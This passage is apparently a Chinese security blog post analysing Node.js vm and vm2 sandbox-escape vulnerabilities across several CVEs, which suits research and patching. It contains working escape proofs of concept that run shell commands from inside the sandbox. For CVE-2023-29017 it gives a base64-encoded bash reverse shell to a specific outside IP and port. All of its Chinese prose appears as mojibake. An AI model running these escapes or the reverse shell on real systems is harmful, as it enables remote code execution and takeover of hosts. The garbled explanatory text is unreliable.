<h5 id="é€šè¿‡geté’©å­è·å–å¯¹è±¡å±æ€§RCEçš„åˆ©ç”¨ä»£ç "><a href="#é€šè¿‡geté’©å­è·å–å¯¹è±¡å±æ€§RCEçš„åˆ©ç”¨ä»£ç " class="headerlink" title="é€šè¿‡geté’©å­è·å–å¯¹è±¡å±æ€§RCEçš„åˆ©ç”¨ä»£ç "></a>é€šè¿‡geté’©å­è·å–å¯¹è±¡å±æ€§RCEçš„åˆ©ç”¨ä»£ç </h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//const sandbox = &#123;&#125;</span></span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">(</span></span><br><span class="line"><span class="string">    ()=&gt;&#123;</span></span><br><span class="line"><span class="string">        const proxy = new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">            get : function()&#123;</span></span><br><span class="line"><span class="string">                const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">                const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">                return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string">        return proxy</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">)()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*]whoami:&quot;</span> + res)</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰è¾“å‡º </p>
<p><img src="/posts/bfeb5984/9.png" alt="img"></p>
<p>è°ƒè¯•åå‘ç° è¿™é‡Œ resä½œä¸ºè¾“å‡º å¦‚æœæ˜¯é€‰æ‹©resè¾“å‡ºçš„è¯ ä¼šè¾“å‡ºresçš„å€¼ è€Œè¾“å‡ºä¸€ä¸ªresä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ å°±ä¼šè§¦å‘RCE  â€¦..  ä½†æ˜¯åœ¨åé¢è°ƒè¯•çš„æ—¶å€™ ä¹‹å‰æ²¡æœ‰æŠ¥é”™ä¼šè¿”å›whoamiçš„ç»“æœ  åé¢åˆè§¦å‘äº†å¼‚å¸¸ï¼Œåœ¨å¼‚å¸¸ä¸­è¾“å‡ºäº†whoamiçš„ç»“æœtest (å¥½åƒæ˜¯whoamiå‘½ä»¤æ—¶å€™æœ‰ç‚¹å¼‚å¸¸ æ¢åšlså‘½ä»¤è¿˜ç®—æ­£å¸¸è§¦å‘äº†rce)   </p>
<p>ä¸‹å›¾æ˜¯è°ƒè¯•çŠ¶æ€ä¸‹è½½è°ƒè¯•æ§åˆ¶å°è¾“å‡ºçš„ç»“æœ </p>
<p><img src="/posts/bfeb5984/10.png" alt="img"></p>
<p>å¦‚æœç›´æ¥è¿è¡Œä¼šè§¦å‘å¼‚å¸¸ åœ¨å¼‚å¸¸ä¸­ä¼šè¾“å‡ºç»“æœ è¿™æ˜¯whomaiçš„ç»“æœ  æœ‰æ—¶å€™ä¸ä¼šè§¦å‘å¼‚å¸¸ ä¸ä¼šè¾“å‡ºç»“æœ</p>
<p><img src="/posts/bfeb5984/11.png" alt="img"></p>
<p>ä½†æ˜¯æ¢æˆlså‘½ä»¤å ä¾¿å¯æ­£å¸¸rce   ğŸ˜“@_@</p>
<p><img src="/posts/bfeb5984/12.png" alt="img"></p>
<h5 id="åˆ©ç”¨å¼‚å¸¸æŠ›å‡ºæ²™ç®±å†…å¯¹è±¡"><a href="#åˆ©ç”¨å¼‚å¸¸æŠ›å‡ºæ²™ç®±å†…å¯¹è±¡" class="headerlink" title="åˆ©ç”¨å¼‚å¸¸æŠ›å‡ºæ²™ç®±å†…å¯¹è±¡"></a>åˆ©ç”¨å¼‚å¸¸æŠ›å‡ºæ²™ç®±å†…å¯¹è±¡</h5><p>é€šè¿‡å¼‚å¸¸ å°†æ²™ç®±å†…çš„å¯¹è±¡æŠ›å‡ºå¹¶åœ¨å¤–éƒ¨è¾“å‡º</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">    throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    vm.<span class="title function_">runInContext</span>(script, vm.<span class="title function_">createContext</span>(sandbox));</span><br><span class="line">&#125;<span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error:&quot;</span> + e) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/13.png" alt="img"></p>
<h3 id="VM2æ²™ç®±"><a href="#VM2æ²™ç®±" class="headerlink" title="VM2æ²™ç®±"></a>VM2æ²™ç®±</h3><p>vm2 æ˜¯åœ¨vmåŸºç¡€ä¸Šå®ç°çš„æ²™ç®±   å†…éƒ¨è°ƒç”¨çš„è¿˜æ˜¯vmçš„APIï¼Œä½¿ç”¨JavaScriptçš„ProxyæŠ€æœ¯æ¥é˜²æ­¢æ²™ç®±é€ƒé€¸</p>
<p>(Proxy å¯å‚è€ƒï¼š<a href="https://juejin.cn/post/6844904090116292616">https://juejin.cn/post/6844904090116292616</a>)</p>
<h4 id="VM2ç»“æ„"><a href="#VM2ç»“æ„" class="headerlink" title="VM2ç»“æ„"></a>VM2ç»“æ„</h4><p><a href="mailto:&#x76;&#x6d;&#x32;&#x40;&#51;&#46;&#x39;&#x2e;&#49;&#52;">&#x76;&#x6d;&#x32;&#x40;&#51;&#46;&#x39;&#x2e;&#49;&#52;</a>ä¸‹ç»“æ„å¦‚ä¸‹</p>
<p><img src="/posts/bfeb5984/14.png" alt="img"></p>
<p><a href="mailto:&#x76;&#109;&#x32;&#x40;&#51;&#x2e;&#x36;&#x2e;&#49;&#48;">&#x76;&#109;&#x32;&#x40;&#51;&#x2e;&#x36;&#x2e;&#49;&#48;</a>ä¸‹ç»“æ„å¦‚ä¸‹</p>
<p><img src="/posts/bfeb5984/15.png" alt="img"></p>
<p>ç›¸æ¯”æ–°ç‰ˆæœ¬ä¸‹ï¼Œè¯¥ç‰ˆæœ¬çš„ç»“æ„è¦ç®€å•å¤š ä¾¿äºå»ç†è§£å…¶åŸç†</p>
<p>ä¸»è¦åŒ…æ‹¬4ä¸ªjsæ–‡ä»¶  <code>cli.js</code> <code>contextify.js</code> <code>main.js</code> <code>sandbox.js</code></p>
<p>å…¶ä¸­ cli.js ä¸»è¦æ˜¯å‘½ä»¤è¡Œçš„è°ƒç”¨</p>
<p><img src="/posts/bfeb5984/16.png" alt="img"></p>
<p><img src="/posts/bfeb5984/17.png" alt="img"></p>
<p>contextify.js å°è£…äº†ä¸‰ä¸ªå¯¹è±¡ï¼šDecontextifyã€Contextify   å¹¶é’ˆå¯¹ globalçš„Bufferç±»è¿›è¡Œçš„ä»£ç†</p>
<p><img src="/posts/bfeb5984/18.png" alt="img"></p>
<p>sandbox.js  å¯¹globalçš„ä¸€äº›å‡½æ•°å’Œå˜é‡è¿›è¡Œäº†hookï¼Œæ¯”å¦‚setTimeoutã€setIntervalã€setImmediateç­‰</p>
<p><img src="/posts/bfeb5984/19.png" alt="img"></p>
<p>main.js æ‰§è¡Œå…¥å£ç‚¹ å¯¼å‡ºNodeVMã€VMè¿™ä¸¤ä¸ªæ²™ç®±ç¯å¢ƒå’ŒVMScript(å°è£…äº†vm.Script)</p>
<p><img src="/posts/bfeb5984/20.png" alt="img"></p>
<h4 id="VM2è¿è¡ŒåŸç†"><a href="#VM2è¿è¡ŒåŸç†" class="headerlink" title="VM2è¿è¡ŒåŸç†"></a>VM2è¿è¡ŒåŸç†</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>, <span class="title class_">VMScript</span>&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> <span class="title class_">VMScript</span>(<span class="string">&quot;let a = 2;a&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> vm = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(vm.<span class="title function_">run</span>(script));</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/21.png" alt="img"></p>
<p>å›¾ç‰‡æºè‡ª<a href="https://www.anquanke.com/post/id/207283#h2-1">https://www.anquanke.com/post/id/207283#h2-1</a></p>
<p>å½“åˆ›å»ºä¸€ä¸ªVMå¯¹è±¡åï¼Œvm2å†…éƒ¨å¼•å…¥contextify.js å¹¶å¯¹contextä¸Šä¸‹æ–‡è¿›è¡Œå°è£…ï¼Œæœ€åå†è°ƒç”¨<code>script.runInContext(context)</code>ã€‚ä»å›¾ä¾¿å¯çœ‹å‡ºvm2æ ¸å¿ƒæ“ä½œåœ¨äºé’ˆå¯¹äºå¯¹contextçš„å°è£…ä¸Šã€‚</p>
<p>åŸç†åˆ†æ è°ƒè¯• å¯å‚è€ƒ </p>
<p><a href="https://www.anquanke.com/post/id/207283#h2-3">https://www.anquanke.com/post/id/207283#h2-3</a></p>
<p><a href="https://blog.csdn.net/anwen12/article/details/120445707">https://blog.csdn.net/anwen12/article/details/120445707</a></p>
<p><a href="https://0xgeekcat.github.io/%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3Node.js%E6%B2%99%E7%AE%B1%E7%8E%AF%E5%A2%83%E5%B9%B6%E5%88%86%E6%9E%90VM2%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86.html#reference">https://0xgeekcat.github.io/%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3Node.js%E6%B2%99%E7%AE%B1%E7%8E%AF%E5%A2%83%E5%B9%B6%E5%88%86%E6%9E%90VM2%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86.html#reference</a></p>
<p>runInContext -&gt; Decontextify.value</p>
<p><img src="/posts/bfeb5984/22.png" alt="img"></p>
<h3 id="VM2ä¸‹æ²™ç®±é€ƒé€¸æ¼æ´åˆ†æ"><a href="#VM2ä¸‹æ²™ç®±é€ƒé€¸æ¼æ´åˆ†æ" class="headerlink" title="VM2ä¸‹æ²™ç®±é€ƒé€¸æ¼æ´åˆ†æ"></a>VM2ä¸‹æ²™ç®±é€ƒé€¸æ¼æ´åˆ†æ</h3><h4 id="CVE-2019-10761"><a href="#CVE-2019-10761" class="headerlink" title="CVE-2019-10761"></a>CVE-2019-10761</h4><p>å‚è€ƒ </p>
<p><a href="https://github.com/patriksimek/vm2/issues/197">https://github.com/patriksimek/vm2/issues/197</a></p>
<p><a href="https://github.com/advisories/GHSA-wf5x-cr3r-xr77">https://github.com/advisories/GHSA-wf5x-cr3r-xr77</a></p>
<p><a href="https://gist.github.com/JLLeitschuh/609bb2efaff22ed84fe182cf574c023a">https://gist.github.com/JLLeitschuh/609bb2efaff22ed84fe182cf574c023a</a></p>
<p>vm2 &lt; 3.6.11</p>
<p><a href="https://github.com/advisories/GHSA-wf5x-cr3r-xr77">https://github.com/advisories/GHSA-wf5x-cr3r-xr77</a></p>
<p>å®‰è£… npm i <a href="mailto:&#x76;&#109;&#50;&#64;&#x33;&#46;&#54;&#46;&#49;&#48;">&#x76;&#109;&#50;&#64;&#x33;&#46;&#54;&#46;&#49;&#48;</a></p>
<p>ä¸‹è½½å®Œåä¼šåœ¨æ¡Œé¢ä¸‹ç”Ÿæˆä¸€æ¶ænode_modules é‡Œé¢æœ‰å®‰è£…çš„vm2 â€¦. ä¹‹å‰æ²¡æ³¨æ„ å› ä¸ºå‰é¢å®‰è£…æ—¶å€™æ˜¯åœ¨.nvmä¸‹é»˜è®¤å®‰è£…çš„</p>
<p><img src="/posts/bfeb5984/23.png" alt="img"></p>
<p><img src="/posts/bfeb5984/24.png" alt="img"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">const f = Buffer.prototype.write;</span></span><br><span class="line"><span class="string">const ft = &#123;</span></span><br><span class="line"><span class="string">		length: 10,</span></span><br><span class="line"><span class="string">		utf8Write()&#123;		&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">function r(i)&#123;  </span></span><br><span class="line"><span class="string">	var x = 0;</span></span><br><span class="line"><span class="string">	try&#123;</span></span><br><span class="line"><span class="string">		x = r(i);</span></span><br><span class="line"><span class="string">	&#125;catch(e)&#123;&#125;</span></span><br><span class="line"><span class="string">	if(typeof(x)!==&#x27;number&#x27;)</span></span><br><span class="line"><span class="string">		return x;</span></span><br><span class="line"><span class="string">	if(x!==i)</span></span><br><span class="line"><span class="string">		return x+1;</span></span><br><span class="line"><span class="string">	try&#123;</span></span><br><span class="line"><span class="string">		f.call(ft);</span></span><br><span class="line"><span class="string">	&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">		return e;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	return null;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">var i=1;</span></span><br><span class="line"><span class="string">while(1)&#123;</span></span><br><span class="line"><span class="string">	try&#123;</span></span><br><span class="line"><span class="string">		i=r(i).constructor.constructor(&quot;return process&quot;)();</span></span><br><span class="line"><span class="string">		break;</span></span><br><span class="line"><span class="string">	&#125;catch(x)&#123;</span></span><br><span class="line"><span class="string">		i++;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">i.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/25.png" alt="img"></p>
<p>å‡è®¾æœ€å¤§æ¬¡æ•°ä¸º 1000 å½“é€’å½’åˆ°æœ€é«˜æ¬¡æ•°æ˜¯ </p>
<p>r(i) é€’å½’å‡½æ•°</p>
<p>f.call(ft);  </p>
<p>ft:  this.utf8Write() </p>
<p>æ²™ç®±é€ƒé€¸ ä»æ²™ç®±å¤–è·å–ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åè·å–è¿™ä¸ªå¯¹è±¡çš„constructorå±æ€§ã€‚</p>
<p>è¿™ä¸ªpocé“¾é€šè¿‡ å¤šæ¬¡é€’å½’è°ƒç”¨ å½“è¾¾åˆ°ä¸€å®šæ¬¡æ•°å(è¶…è¿‡æœ€å¤§è°ƒç”¨å †æ ˆçš„å¤§å°)ï¼Œå½“æˆ‘ä»¬æ­£åœ¨è°ƒç”¨æ²™ç®±å¤–çš„å‡½æ•°æ—¶ï¼Œå°±ä¼šå¯¼è‡´æ²™ç®±å¤–çš„è°ƒç”¨æ ˆè¢«çˆ†æ‰ï¼Œæˆ‘ä»¬åœ¨æ²™ç®±å†…catchè¿™ä¸ªå¼‚å¸¸å¯¹è±¡ï¼Œå°±æ‹¿åˆ°äº†ä¸€ä¸ªæ²™ç®±å¤–çš„å¯¹è±¡</p>
<h4 id="CVE-2021-23449"><a href="#CVE-2021-23449" class="headerlink" title="CVE-2021-23449"></a>CVE-2021-23449</h4><p>vm2 &lt; 3.9.4</p>
<p>å‚è€ƒä»¥ä¸‹pç‰›çš„è¯´æ³•:</p>
<p>åœ¨JavaScriptä¸­ import()æ˜¯ä¸€ä¸ªè¯­æ³•ç»“æ„ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ— æ³•é€šè¿‡åƒæ˜¯ä½¿ç”¨requireçš„æ–¹æ³•æ¥å¤„ç†import</p>
<p>åœ¨è°ƒç”¨import()çš„ç»“æœå®é™…ä¸Šå¹¶æ²¡æœ‰ç»è¿‡æ²™ç®±ï¼Œæ˜¯ä¸€ä¸ªå¤–éƒ¨å˜é‡ï¼Œå¯ä»¥ç›´æ¥è·å–constructorè¿›è€Œè·å–åˆ°processå¯¹è±¡æ¥å®ç°å‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> res = <span class="keyword">import</span>(<span class="string">&#x27;./foo.js&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">toString</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return this&quot;</span></span>)(<span class="params"></span>).<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;pwd&quot;</span>).<span class="title function_">toString</span>());</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/26.png" alt="img"></p>
<h4 id="CVE-2022-36067"><a href="#CVE-2022-36067" class="headerlink" title="CVE-2022-36067"></a>CVE-2022-36067</h4><p>å‚è€ƒ <a href="https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067">https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067</a></p>
<p><a href="https://github.com/advisories/GHSA-mrgp-mrhc-5jrq">https://github.com/advisories/GHSA-mrgp-mrhc-5jrq</a></p>
<h4 id="CVE-2023-29017"><a href="#CVE-2023-29017" class="headerlink" title="CVE-2023-29017"></a>CVE-2023-29017</h4><p>åœ¨å¤„ç†å¼‚æ­¥é”™è¯¯æ—¶ æœªæ­£ç¡®å¤„ç†<code> Error.prepareStackTraceçš„</code>å®¿ä¸»å¯¹è±¡ ä»è€Œå®ç°æ²™ç®±ç»•è¿‡ã€‚å½“å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œå¯ä»¥ä½¿ç”¨Error.prepareStackTraceè‡ªå®šä¹‰å¼‚å¸¸</p>
<p>åœ¨sandbox.jsä¸­ å®šä¹‰ç±»</p>
<h5 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h5><p>vm2 &lt;= 3.9.14</p>
<p>åŒæ—¶éœ€è¦ Node.js ç‰ˆæœ¬æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<p>Node.js &gt; 16.14.0</p>
<p>Node.js &gt; 17.4.0</p>
<p>Node.js 18.x</p>
<p>Node.js 19.x</p>
<h5 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h5><h6 id="å®‰è£…node-js"><a href="#å®‰è£…node-js" class="headerlink" title="å®‰è£…node js"></a>å®‰è£…node js</h6><p>å®‰è£… nvm</p>
<p>curl -o- <a href="https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh">https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh</a> | bash</p>
<p>æŸ¥çœ‹nodejså¯å®‰è£…ç‰ˆæœ¬(é‡å¯ä¸€ä¸ªç»ˆç«¯)</p>
<p>nvm ls-remote</p>
<p>å®‰è£…æŒ‡å®šç‰ˆæœ¬çš„nodejs</p>
<p>nvm install v17.5.0</p>
<p><img src="/posts/bfeb5984/27.png" alt="img"></p>
<h6 id="å®‰è£…vm2"><a href="#å®‰è£…vm2" class="headerlink" title="å®‰è£…vm2"></a>å®‰è£…vm2</h6><p>npm install <a href="mailto:&#118;&#109;&#x32;&#64;&#x33;&#x2e;&#x39;&#x2e;&#49;&#x34;">&#118;&#109;&#x32;&#64;&#x33;&#x2e;&#x39;&#x2e;&#49;&#x34;</a>        ï¼ˆnpm install å®‰è£…æŒ‡å®šç‰ˆæœ¬æ—¶ åé¢@åŠ ç‰ˆæœ¬å·å³å¯ï¼‰</p>
<h5 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h5><p>é—®é¢˜ä¸»è¦åœ¨äºsstè¿™ä¸ªåœ°æ–¹ æ²¡æœ‰è€ƒè™‘sstæ˜¯å¦æ˜¯æ²™ç®±å¤„ç†è¿‡çš„å¯¹è±¡ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªå®¿ä¸»çš„å¯¹è±¡ï¼Œé‚£ä¹ˆè¿™ä¸ªsstå¯ä»¥åœ¨<code>prepareStackTrcae</code>æ‰§è¡Œæ—¶ä½œä¸ºå‚æ•°ä½¿ç”¨</p>
<p><img src="/posts/bfeb5984/28.png" alt="img"></p>
<p>åœ¨æ¼æ´<a href="https://github.com/patriksimek/vm2/commit/d534e5785f38307b70d3aac1945260a261a94d50">ä¿®å¤</a>ä¸­ ä½¿ç”¨<code>ensureThisï¼ˆï¼‰</code>å‡½æ•°å¯¹sstè¿›è¡ŒéªŒè¯ï¼Œç¡®ä¿è¯¥å‡½æ•°æ˜¯ç»è¿‡Proxyå¤„ç†çš„å¯¹è±¡</p>
<p><img src="/posts/bfeb5984/29.png" alt="img"></p>
<p>åˆ†ææ–‡ç« å¯ä»¥å‚è€ƒ </p>
<p><a href="https://github.com/patriksimek/vm2/issues/515">https://github.com/patriksimek/vm2/issues/515</a></p>
<p><a href="https://mp.weixin.qq.com/s/OwQ3B5vjpr9ZsvOXftJoQg">https://mp.weixin.qq.com/s/OwQ3B5vjpr9ZsvOXftJoQg</a></p>
<p><a href="https://github.com/patriksimek/vm2/commit/d534e5785f38307b70d3aac1945260a261a94d50">https://github.com/patriksimek/vm2/commit/d534e5785f38307b70d3aac1945260a261a94d50</a></p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><p><a href="https://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d">https://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d</a></p>
<p>åå¼¹shell</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> vmInstance = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">Error.prepareStackTrace = (e, frames) =&gt; &#123;</span></span><br><span class="line"><span class="string">    frames.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuNTIuMjIxLjcxLzg4ODggMD4mMQ==|base64 -d|bash&#x27;); </span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">(async ()=&gt;&#123;&#125;).constructor(&#x27;return process&#x27;)()</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br><span class="line">vmInstance.<span class="title function_">run</span>(code);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/30.png" alt="img"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">aa</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;1=1&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">aa</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šè¿‡asyncäº§ç”Ÿä¸€ä¸ªæœªå¤„ç†çš„å¼‚æ­¥å¼‚å¸¸  </span></span><br><span class="line"><span class="comment">// eval()åœ¨aaå‡½æ•°ä¸­è·‘å‡ºä¸€ä¸ªè¯­æ³•é”™è¯¯æ¥è§¦å‘ä¸€ä¸ªæœªå¤„ç†çš„å¼‚æ­¥é”™è¯¯</span></span><br></pre></td></tr></table></figure>



<h4 id="CVE-2023-29199"><a href="#CVE-2023-29199" class="headerlink" title="CVE-2023-29199"></a>CVE-2023-29199</h4><p>å½±å“ç‰ˆæœ¬ &lt;=3.9.15  </p>
<p>è¿™é‡Œæœ‰ç¯‡ transformerçš„æºç åˆ†æçš„æ–‡ç«  å¯å‚è€ƒ <a href="https://blog.csdn.net/Yy_Rose/article/details/127534335">https://blog.csdn.net/Yy_Rose/article/details/127534335</a></p>
<p>æ”»å‡»è€…å¯ä»¥ä½¿ç”¨<code>$tmpname</code>çš„æ ‡è¯†ç¬¦å»ç»•è¿‡ handleExecption()å®ç°æ²™ç®±é€ƒé€¸åˆ°è¾¾rceçš„æ•ˆæœ</p>
<h5 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h5><p>é—®é¢˜å‡ºç°åœ¨transformer.js ä¸‹çš„transformerå‡½æ•°ï¼Œå…ˆç®€å•çœ‹ä¸€ä¸‹transformerçš„ä»£ç </p>
<p>åœ¨transform.jsä¸­ å…ˆå¯¼å…¥äº†acron(jsçš„ä¸€ä¸ªè§£æå™¨) å’Œ acorn-walk(æä¾›éå†) ï¼Œç„¶åå®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡INTERNAL_STATE_NAME åé¢ä¹Ÿä¼šå†æ¬¡ç”¨åˆ°</p>
<p><img src="/posts/bfeb5984/31.png" alt="img"></p>
<p>ä¸»è¦å®ç°äº†ä¸‰ä¸ªå‡½æ•° assertType() ã€makeNiceSyntaxError()å’Œ transformer()</p>
<p><img src="/posts/bfeb5984/32.png" alt="img"></p>
<p>asserType() å‡½æ•°ä¸»è¦æ˜¯è¿”å›nodeèŠ‚ç‚¹ å¦‚æœèŠ‚ç‚¹ä¸ºæ— æ•ˆç±»å‹ï¼Œåˆ™ä¼šæŠ›å‡ºå¼‚å¸¸</p>
<p>makeNiceSyntaxError()`åˆ™æ˜¯ä¸€ä¸ªå¤„ç†å¼‚å¸¸çš„å‡½æ•° å¯æš‚ä¸”ä¸çœ‹</p>
<p>æœ‰æ¯”è¾ƒå¤šçš„å†…å®¹æ˜¯å¯¹transformer()å‡½æ•°çš„å®ç°ï¼Œ</p>
<p><img src="/posts/bfeb5984/33.png" alt="img"></p>
<p>å®šä¹‰ä¸€ä¸ªastï¼Œ é€šè¿‡acornçš„è§£æå™¨Parser å°†jsä»£ç è½¬æ¢ä¸ºast.</p>
<p><img src="/posts/bfeb5984/34.png" alt="img"></p>
<p><img src="/posts/bfeb5984/35.png" alt="img"></p>
<p>åˆ¤æ–­CBodyæ˜¯å¦æ˜¯ä¸ºBlockStatementä»£ç å—è¯­å¥</p>
<p><img src="/posts/bfeb5984/36.png" alt="img"></p>
<p><img src="/posts/bfeb5984/37.png" alt="img"></p>
<p>å½“é€šè¿‡tryæ•è·çš„å‚æ•°ä¸ºundefinedæœªå®šä¹‰æ—¶ï¼Œåˆ™ä¼šæŠ›å‡ºmakeNiceSyntaxErrorå¼‚å¸¸ï¼Œå‰æ–‡ä¸­çš„catchå¤„å°†è¢«æ›´æ”¹å†…å®¹ï¼ŒINTERNAL_STATE_NAMEä¼šè¢«è°ƒç”¨ï¼Œå¹¶æŠ¥é”™Use of internal vm2 state variableï¼Œä¼šæ‰§è¡Œcatchåçš„å†…å®¹ã€‚</p>
<p>åœ¨catchçš„codeå¤„ <code>$&#123;name&#125;=$&#123;INTERNAL_STATE_NAME&#125;.handleException($&#123;name&#125;)</code>  <code>catch($tmpname)&#123;try&#123;throw $&#123;INTERNAL_STATE_NAME&#125;.handleException($tmpname);&#125;</code></p>
<p><img src="/posts/bfeb5984/38.png" alt="img"></p>
